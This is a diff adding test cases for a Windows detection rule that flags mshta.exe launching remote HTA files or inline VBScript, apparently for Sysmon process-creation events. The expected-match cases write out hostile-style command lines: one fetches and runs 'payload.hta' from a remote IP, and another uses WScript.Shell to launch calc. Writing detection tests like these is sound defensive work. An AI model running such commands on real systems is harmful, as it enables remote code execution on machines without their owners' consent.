@@ -1,0 +1,25 @@
+rule: mshta_remote.yml
+cases:
+  - name:   remote hta
+    expect: match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      Image:       C:\Windows\System32\mshta.exe
+      CommandLine: mshta.exe http://198.51.100.7/payload.hta
+
+  - name:   inline vbscript, mixed case
+    expect: match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      Image:       C:\Windows\SysWOW64\MSHTA.EXE
+      CommandLine: 'mshta VBScript:Execute("CreateObject(""WScript.Shell"").Run ""calc"":close")'
+
+  - name:   local hta from Program Files
+    expect: no-match
+    event:
+      channel:     Microsoft-Windows-Sysmon/Operational
+      event_id:    1
+      Image:       C:\Windows\System32\mshta.exe
+      CommandLine: '"C:\Windows\System32\mshta.exe" "C:\Program Files\Vendor\setup.hta"'
